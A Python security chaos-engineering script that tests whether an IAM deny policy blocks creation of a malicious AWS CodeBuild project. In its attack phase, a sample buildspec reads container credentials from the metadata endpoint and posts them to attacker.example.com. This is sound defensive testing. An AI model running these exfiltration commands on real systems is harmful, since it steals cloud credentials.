"""
SCE Experiment 1.3 — Preventive Probe
Attack Node: 1.2 Create Malicious CodeBuild Project

Security Intent:
  Prevent an attacker from creating a CodeBuild project that exfiltrates
  credentials or executes arbitrary commands by enforcing an AWS-native
  preventive control: a Service Control Policy (SCP) or, in a single-account
  context, an IAM permission boundary / deny policy that blocks
  codebuild:CreateProject for principals that are not explicitly authorised.

  In this single-account experiment we implement the control as an IAM
  managed policy with an explicit Deny on codebuild:CreateProject attached
  to the attack IAM role, and verify that the attack call is blocked
  (AccessDenied).  This is the correct AWS-native preventive pattern when
  SCPs are unavailable (single account, no AWS Organizations).

Flow:
  1. steady_state()  – deploy CFN stack (IAM role + deny policy + CodeBuild
                       service role), record resource names globally.
  2. attack()        – assume the constrained IAM role and attempt
                       codebuild:CreateProject; capture the real API response.
  3. hypothesis_verification() – confirm the project was NOT created
                                  (AccessDenied was enforced).
  4. rollback()      – delete the CFN stack and wait for completion.
"""

import json
import sys
import time
import logging
import boto3
from botocore.exceptions import ClientError

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
)
log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Global state (set by steady_state, consumed by later phases)
# ---------------------------------------------------------------------------
STACK_NAME: str = ""
TIMESTAMP: int = 0
ATTACK_ROLE_ARN: str = ""
CODEBUILD_ROLE_ARN: str = ""
MALICIOUS_PROJECT_NAME: str = ""
REGION: str = ""
ACCOUNT_ID: str = ""

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _get_session() -> boto3.Session:
    return boto3.Session()


def _cf_client():
    return _get_session().client("cloudformation", region_name=REGION)


def _iam_client():
    return _get_session().client("iam")


def _sts_client():
    return _get_session().client("sts", region_name=REGION)


def _codebuild_client(credentials: dict | None = None):
    if credentials:
        return boto3.client(
            "codebuild",
            region_name=REGION,
            aws_access_key_id=credentials["AccessKeyId"],
            aws_secret_access_key=credentials["SecretAccessKey"],
            aws_session_token=credentials["SessionToken"],
        )
    return _get_session().client("codebuild", region_name=REGION)


def _wait(condition_fn, timeout_s: int = 300, interval_s: int = 10, label: str = ""):
    """Bounded busy-wait using time.monotonic()."""
    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        result = condition_fn()
        if result:
            return True
        log.info("  … waiting for %s (retrying in %ds)", label, interval_s)
        time.sleep(interval_s)
    raise TimeoutError(f"Timed out waiting for: {label}")


# ---------------------------------------------------------------------------
# CloudFormation template
# ---------------------------------------------------------------------------

def _build_cfn_template(ts: int) -> str:
    """
    Creates:
      - AttackRole          : IAM role that simulates a compromised developer
      - DenyCodeBuildPolicy : Managed policy that DENIES codebuild:CreateProject
                              (the preventive control under test)
      - CodeBuildServiceRole: Minimal role that CodeBuild would need (used as
                              serviceRole arg in the attack; no extra perms)
    """
    template = {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Description": f"SCE 1.3 Preventive probe – ts={ts}",
        "Resources": {
            # ---- Preventive-control policy (DENY codebuild:CreateProject) ----
            "DenyCodeBuildCreatePolicy": {
                "Type": "AWS::IAM::ManagedPolicy",
                "Properties": {
                    "ManagedPolicyName": f"sce-deny-cb-create-{ts}",
                    "Description": "SCE preventive control: deny codebuild:CreateProject",
                    "PolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Sid": "DenyCreateMaliciousCodeBuildProject",
                                "Effect": "Deny",
                                "Action": ["codebuild:CreateProject"],
                                "Resource": "*",
                            }
                        ],
                    },
                },
            },
            # ---- Simulated attacker role (has the deny policy attached) ----
            "AttackRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-attack-role-{ts}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {"AWS": {"Fn::Sub": "${AWS::AccountId}"}},
                                "Action": "sts:AssumeRole",
                            }
                        ],
                    },
                    "ManagedPolicyArns": [
                        # Broad allow — the explicit Deny above overrides this
                        "arn:aws:iam::aws:policy/AWSCodeBuildAdminAccess",
                        {"Ref": "DenyCodeBuildCreatePolicy"},
                    ],
                    "Tags": [
                        {"Key": "SCEExperiment", "Value": "1.3"},
                        {"Key": "SCETimestamp", "Value": str(ts)},
                    ],
                },
                "DependsOn": ["DenyCodeBuildCreatePolicy"],
            },
            # ---- Minimal CodeBuild service role (referenced in attack call) ----
            "CodeBuildServiceRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-cb-service-role-{ts}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {"Service": "codebuild.amazonaws.com"},
                                "Action": "sts:AssumeRole",
                            }
                        ],
                    },
                    "Policies": [
                        {
                            "PolicyName": "minimal",
                            "PolicyDocument": {
                                "Version": "2012-10-17",
                                "Statement": [
                                    {
                                        "Effect": "Allow",
                                        "Action": ["logs:CreateLogGroup", "logs:CreateLogStream", "logs:PutLogEvents"],
                                        "Resource": "*",
                                    }
                                ],
                            },
                        }
                    ],
                    "Tags": [
                        {"Key": "SCEExperiment", "Value": "1.3"},
                        {"Key": "SCETimestamp", "Value": str(ts)},
                    ],
                },
            },
        },
        "Outputs": {
            "AttackRoleArn": {
                "Value": {"Fn::GetAtt": ["AttackRole", "Arn"]},
                "Export": {"Name": f"sce-attack-role-arn-{ts}"},
            },
            "CodeBuildServiceRoleArn": {
                "Value": {"Fn::GetAtt": ["CodeBuildServiceRole", "Arn"]},
                "Export": {"Name": f"sce-cb-service-role-arn-{ts}"},
            },
            "DenyPolicyArn": {
                "Value": {"Ref": "DenyCodeBuildCreatePolicy"},
                "Export": {"Name": f"sce-deny-policy-arn-{ts}"},
            },
        },
    }
    return json.dumps(template)


# ---------------------------------------------------------------------------
# Phase 1 – steady_state
# ---------------------------------------------------------------------------

def steady_state() -> None:
    global STACK_NAME, TIMESTAMP, ATTACK_ROLE_ARN, CODEBUILD_ROLE_ARN
    global MALICIOUS_PROJECT_NAME, REGION, ACCOUNT_ID

    TIMESTAMP = int(time.time())
    STACK_NAME = f"sce-experiment-{TIMESTAMP}"
    MALICIOUS_PROJECT_NAME = f"sce-malicious-cb-{TIMESTAMP}"

    # Discover region and account from live credentials
    sts = _get_session().client("sts")
    caller = sts.get_caller_identity()
    ACCOUNT_ID = caller["Account"]

    session = _get_session()
    REGION = session.region_name or "us-east-1"

    log.info("=== steady_state() ===")
    log.info("Stack        : %s", STACK_NAME)
    log.info("Region       : %s", REGION)
    log.info("Account      : %s", ACCOUNT_ID)
    log.info("Project name : %s", MALICIOUS_PROJECT_NAME)

    cf = _cf_client()
    template_body = _build_cfn_template(TIMESTAMP)

    # Create stack (handle pre-existing gracefully)
    try:
        cf.create_stack(
            StackName=STACK_NAME,
            TemplateBody=template_body,
            Capabilities=["CAPABILITY_NAMED_IAM"],
            Tags=[
                {"Key": "SCEExperiment", "Value": "1.3"},
                {"Key": "SCETimestamp", "Value": str(TIMESTAMP)},
                {"Key": "Purpose", "Value": "security-chaos-engineering"},
            ],
            OnFailure="ROLLBACK",
        )
        log.info("CloudFormation stack creation initiated.")
    except ClientError as exc:
        code = exc.response["Error"]["Code"]
        if code == "AlreadyExistsException":
            log.warning("Stack %s already exists — continuing.", STACK_NAME)
        else:
            log.error("create_stack failed: %s", exc)
            raise

    # Wait for CREATE_COMPLETE
    def _stack_ready():
        resp = cf.describe_stacks(StackName=STACK_NAME)
        status = resp["Stacks"][0]["StackStatus"]
        log.info("  Stack status: %s", status)
        if status == "CREATE_COMPLETE":
            return True
        if "FAILED" in status or "ROLLBACK" in status:
            raise RuntimeError(f"Stack entered failure state: {status}")
        return False

    _wait(_stack_ready, timeout_s=300, interval_s=15, label="CREATE_COMPLETE")

    # Collect outputs
    resp = cf.describe_stacks(StackName=STACK_NAME)
    outputs = {o["OutputKey"]: o["OutputValue"] for o in resp["Stacks"][0].get("Outputs", [])}
    ATTACK_ROLE_ARN = outputs["AttackRoleArn"]
    CODEBUILD_ROLE_ARN = outputs["CodeBuildServiceRoleArn"]

    log.info("AttackRoleArn      : %s", ATTACK_ROLE_ARN)
    log.info("CodeBuildSvcRoleArn: %s", CODEBUILD_ROLE_ARN)
    log.info("steady_state() complete — preventive control deployed.")


# ---------------------------------------------------------------------------
# Phase 2 – attack
# ---------------------------------------------------------------------------

def attack() -> bool:
    """
    Simulate attacker attempting codebuild:CreateProject via the
    constrained AttackRole.  The preventive control (Deny policy) should
    block this call with AccessDenied.

    Returns True  if the attack attempt was executed and produced a
                  real AWS-side response (AccessDenied counts as evidence
                  that the attack was *attempted*).
    Returns False if an unexpected error prevented us from even making
                  the attempt.
    """
    log.info("=== attack() ===")
    log.info("Assuming AttackRole: %s", ATTACK_ROLE_ARN)

    # --- Step 1: Assume the attacker role ---
    sts = _sts_client()

    # IAM role propagation may take a few seconds after CFN CREATE_COMPLETE
    assumed = None
    def _assume():
        nonlocal assumed
        try:
            assumed = sts.assume_role(
                RoleArn=ATTACK_ROLE_ARN,
                RoleSessionName=f"sce-attack-{TIMESTAMP}",
                DurationSeconds=900,
            )
            return True
        except ClientError as exc:
            if exc.response["Error"]["Code"] in ("InvalidClientTokenId", "AccessDenied"):
                log.info("  Role not yet assumable: %s", exc.response["Error"]["Code"])
                return False
            raise

    _wait(_assume, timeout_s=60, interval_s=5, label="AttackRole assumable")

    creds = assumed["Credentials"]
    log.info("Successfully assumed AttackRole (session expires: %s)",
             creds["Expiration"])

    # --- Step 2: Attempt to create a malicious CodeBuild project ---
    cb = _codebuild_client(creds)

    malicious_buildspec = {
        "version": "0.2",
        "phases": {
            "build": {
                "commands": [
                    "curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > /tmp/creds.json",
                    "curl -X POST https://attacker.example.com/exfil -d @/tmp/creds.json",
                ]
            }
        },
    }

    try:
        response = cb.create_project(
            name=MALICIOUS_PROJECT_NAME,
            source={
                "type": "NO_SOURCE",
                "buildspec": json.dumps(malicious_buildspec),
            },
            artifacts={"type": "NO_ARTIFACTS"},
            environment={
                "type": "LINUX_CONTAINER",
                "computeType": "BUILD_GENERAL1_SMALL",
                "image": "aws/codebuild/standard:7.0",
            },
            serviceRole=CODEBUILD_ROLE_ARN,
        )
        # If we reach here the project was CREATED — preventive control failed
        project_arn = response["project"]["arn"]
        log.error(
            "ATTACK SUCCEEDED (control FAILED): project created with ARN %s",
            project_arn,
        )
        # Record evidence of the unexpected success for the verifier
        attack.project_created = True
        attack.response_arn = project_arn
        return True  # attack was executed; hypothesis_verification will return False

    except ClientError as exc:
        error_code = exc.response["Error"]["Code"]
        http_status = exc.response["ResponseMetadata"]["HTTPStatusCode"]
        request_id = exc.response["ResponseMetadata"]["RequestId"]

        if error_code == "AccessDeniedException":
            log.info(
                "Attack BLOCKED by preventive control — AccessDeniedException "
                "(HTTP %d, RequestId: %s)",
                http_status,
                request_id,
            )
            attack.project_created = False
            attack.blocked_error_code = error_code
            attack.blocked_http_status = http_status
            attack.blocked_request_id = request_id
            return True  # attack was attempted; evidence captured

        log.error("Unexpected error during attack: %s — %s", error_code, exc)
        return False


# Attach state to the function so hypothesis_verification can inspect it
attack.project_created = None
attack.blocked_error_code = None
attack.blocked_http_status = None
attack.blocked_request_id = None


# ---------------------------------------------------------------------------
# Phase 3 – hypothesis_verification
# ---------------------------------------------------------------------------

def hypothesis_verification() -> bool:
    """
    Preventive probe: verify that the malicious CodeBuild project does NOT
    exist in the account.

    1. Query codebuild:BatchGetProjects for MALICIOUS_PROJECT_NAME using the
       *root* session (admin view — no permission filter).
    2. If the project is absent from the response → control worked → True.
    3. If the project IS present → control failed → False.

    Also cross-checks the IAM deny policy still exists to confirm it was
    not removed mid-experiment.
    """
    log.info("=== hypothesis_verification() ===")

    if not MALICIOUS_PROJECT_NAME:
        log.error("MALICIOUS_PROJECT_NAME not set — steady_state() must run first.")
        return False

    # --- Check 1: Does the malicious project exist? ---
    cb = _codebuild_client()  # admin credentials
    try:
        resp = cb.batch_get_projects(names=[MALICIOUS_PROJECT_NAME])
    except ClientError as exc:
        log.error("batch_get_projects failed: %s", exc)
        return False

    found_projects = resp.get("projects", [])
    missing_names = resp.get("projectsNotFound", [])

    log.info(
        "batch_get_projects result — found: %s, notFound: %s",
        [p["name"] for p in found_projects],
        missing_names,
    )

    project_absent = MALICIOUS_PROJECT_NAME in missing_names and len(found_projects) == 0

    if not project_absent:
        log.error(
            "HYPOTHESIS FAILED: malicious project '%s' EXISTS in the account — "
            "preventive control did NOT block the attack.",
            MALICIOUS_PROJECT_NAME,
        )
        # Clean up the rogue project before rolling back the stack
        try:
            cb.delete_project(name=MALICIOUS_PROJECT_NAME)
            log.info("Cleaned up rogue project '%s'.", MALICIOUS_PROJECT_NAME)
        except ClientError as exc2:
            log.warning("Could not clean up rogue project: %s", exc2)
        return False

    # --- Check 2: Verify deny policy is still attached to the attack role ---
    iam = _iam_client()
    try:
        role_resp = iam.list_attached_role_policies(
            RoleName=f"sce-attack-role-{TIMESTAMP}"
        )
        attached_names = [p["PolicyName"] for p in role_resp["AttachedPolicies"]]
        deny_policy_name = f"sce-deny-cb-create-{TIMESTAMP}"
        policy_attached = deny_policy_name in attached_names
        log.info(
            "Deny policy '%s' attached to attack role: %s",
            deny_policy_name,
            policy_attached,
        )
    except ClientError as exc:
        log.error("list_attached_role_policies failed: %s", exc)
        return False

    if not policy_attached:
        log.error(
            "HYPOTHESIS FAILED: deny policy '%s' is no longer attached to the attack role.",
            deny_policy_name,
        )
        return False

    # --- All checks passed ---
    log.info(
        "HYPOTHESIS VERIFIED: malicious CodeBuild project '%s' was NOT created "
        "(preventive deny policy is active and effective).",
        MALICIOUS_PROJECT_NAME,
    )
    return True


# ---------------------------------------------------------------------------
# Phase 4 – rollback
# ---------------------------------------------------------------------------

def rollback() -> None:
    log.info("=== rollback() ===")

    if not STACK_NAME:
        log.warning("STACK_NAME not set — nothing to roll back.")
        return

    cf = _cf_client()

    # Safety net: if rogue project slipped through, delete it
    if MALICIOUS_PROJECT_NAME:
        try:
            cb = _codebuild_client()
            cb.delete_project(name=MALICIOUS_PROJECT_NAME)
            log.info("Deleted CodeBuild project '%s' during rollback.", MALICIOUS_PROJECT_NAME)
        except ClientError as exc:
            if exc.response["Error"]["Code"] != "ResourceNotFoundException":
                log.warning("Could not delete project during rollback: %s", exc)

    # Delete CFN stack
    try:
        cf.delete_stack(StackName=STACK_NAME)
        log.info("Stack deletion initiated: %s", STACK_NAME)
    except ClientError as exc:
        if exc.response["Error"]["Code"] == "ValidationError" and \
                "does not exist" in exc.response["Error"]["Message"]:
            log.info("Stack '%s' does not exist — nothing to delete.", STACK_NAME)
            return
        log.error("delete_stack error: %s", exc)
        raise

    def _stack_gone():
        try:
            resp = cf.describe_stacks(StackName=STACK_NAME)
            status = resp["Stacks"][0]["StackStatus"]
            log.info("  Stack status: %s", status)
            if "DELETE_COMPLETE" in status:
                return True
            if "DELETE_FAILED" in status:
                raise RuntimeError(f"Stack delete failed: {status}")
            return False
        except ClientError as exc2:
            if exc2.response["Error"]["Code"] == "ValidationError":
                log.info("  Stack no longer visible — deletion complete.")
                return True
            raise

    _wait(_stack_gone, timeout_s=300, interval_s=15, label="DELETE_COMPLETE")
    log.info("Stack '%s' deleted successfully.", STACK_NAME)


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------

def main():
    log.info("########  SCE 1.3 — Preventive Probe: Block CreateProject  ########")
    exit_code = 0
    try:
        # Phase 1
        steady_state()

        # Phase 2
        attack_result = attack()
        log.info("attack() returned: %s", attack_result)
        if not attack_result:
            log.error("Attack phase failed to produce evidence — aborting.")
            exit_code = 1

        # Phase 3
        verified = hypothesis_verification()
        log.info("hypothesis_verification() returned: %s", verified)
        if not verified:
            log.error("Hypothesis NOT verified — preventive control is INEFFECTIVE.")
            exit_code = 2
        else:
            log.info("SUCCESS: Preventive control confirmed effective.")

    except Exception as exc:
        log.exception("Unhandled exception in experiment: %s", exc)
        exit_code = 99
    finally:
        try:
            rollback()
        except Exception as rb_exc:
            log.exception("Rollback failed: %s", rb_exc)

    log.info("Experiment complete — exit code: %d", exit_code)
    sys.exit(exit_code)


if __name__ == "__main__":
    main()